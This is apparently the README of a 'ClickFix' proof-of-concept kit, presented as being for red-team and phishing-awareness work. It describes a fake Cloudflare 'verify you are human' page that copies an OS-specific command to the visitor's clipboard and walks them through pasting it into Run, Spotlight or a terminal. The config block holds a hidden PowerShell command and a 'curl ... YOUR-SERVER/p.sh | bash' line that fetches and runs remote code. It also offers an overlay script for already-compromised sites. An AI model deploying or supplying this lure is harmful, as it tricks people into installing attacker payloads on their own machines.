# ClickFix — Cloudflare Turnstile PoC

A fake Cloudflare "Verify you are human" page that detects the visitor's OS, copies the right command to their clipboard, and shows matching steps.

Built for red team engagements and phishing awareness training.

---

## What it does

- Detects **Windows / macOS / Linux**
- Copies an **OS-specific command** to the clipboard on click
- Shows the **correct steps** for that OS (Win+R, Spotlight, Ctrl+Alt+T)
- Looks like the real Cloudflare Turnstile widget — dark mode included

---

## Files

| File | Use |
|------|-----|
| `index.html` | Standalone demo — just open it |
| `clickfix.js` | Drop-in overlay for an already-compromised page |

---

## Setup

Open the file and edit the `CONFIG` block at the top:

```js
const CONFIG = {
  domain: '',                       // leave empty to auto-detect
  windows: 'powershell -w hidden -c "..."',
  mac:     'curl -fsSL https://YOUR-SERVER/p.sh | bash',
  linux:   'curl -fsSL https://YOUR-SERVER/p.sh | bash',
  redirectUrl: null
};
